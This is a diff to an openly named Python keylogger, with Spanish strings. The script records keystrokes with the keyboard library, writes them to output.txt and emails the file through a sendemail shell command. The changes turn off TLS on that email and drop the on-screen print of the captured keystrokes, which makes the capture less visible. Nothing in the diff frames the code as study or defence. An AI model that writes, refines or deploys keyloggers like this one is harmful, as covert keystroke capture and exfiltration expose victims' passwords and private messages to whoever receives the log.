@@ -1,5 +1,6 @@
 import keyboard
 import subprocess
+from os import remove
 
 registros = []
 
@@ -11,8 +12,9 @@ def output(text):
         f.write(text)
 
 def send_email(sender_email, receiver_email):
-    command = f"sendemail -f {sender_email} -t {receiver_email} -u 'Registros de Keylogger' -m 'Se adjunta el archivo de registros' -a output.txt"
+    command = f"sendemail -f {sender_email} -t {receiver_email} -u 'Registros de Keylogger' -m 'Se adjunta el archivo de registros' -a output.txt -o tls=no"
     subprocess.run(command, shell=True)
+
 
 
 def main():
@@ -38,8 +40,6 @@ def main():
     keyboard.unhook_all()
     
     registro = ",".join(registros)
-
-    print(registro)
     output(registro)
     
     if respuesta_email.lower() in ['yes', 'y']:
@@ -56,4 +56,3 @@ def main():
 
 if __name__ == "__main__":
     main()
-
